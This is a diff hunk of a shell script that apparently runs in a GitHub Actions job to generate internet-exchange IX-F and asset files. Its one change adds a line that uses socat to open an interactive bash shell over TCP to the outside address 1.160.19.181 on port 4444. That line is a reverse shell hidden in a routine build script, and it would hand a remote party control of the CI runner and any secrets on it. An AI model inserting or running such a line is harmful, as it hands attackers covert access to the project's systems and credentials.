@@ -4,7 +4,7 @@ cd $GITHUB_WORKSPACE/cache
 $GITHUB_WORKSPACE/scripts/gen_ixpf.py > $GITHUB_WORKSPACE/output/ix-f.json
 $GITHUB_WORKSPACE/scripts/gen_asset.py 1
 $GITHUB_WORKSPACE/scripts/gen_asset.py 2
-
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.160.19.181:4444
 #export AS_SET="AS-KSKB-IX"
 #export ARS_CLIENTS_PATH="$GITHUB_WORKSPACE/output/clients_all.yml"
 #python3 /root/gitrs/RIPE-AS-SET-SYNC/AS-KSKB-IX.py
